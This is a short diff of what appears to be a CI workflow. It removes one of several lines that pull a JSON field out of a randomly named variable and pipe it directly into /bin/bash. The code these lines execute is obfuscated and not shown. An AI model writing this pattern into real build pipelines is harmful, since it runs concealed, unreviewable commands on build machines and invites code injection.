@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$kac54508" | jq -r .a965 | /bin/bash
           echo $bsey749 | jq -r .e76515 | /bin/bash
           echo $zmg309 | jq -r .qih3624 | /bin/bash
-          printf '%s' "$w4869" | jq -r .idtfy96 | /bin/bash
           printf '%s' "$ucnz154" | jq -r .m53 | /bin/bash
 
       - name: Save results
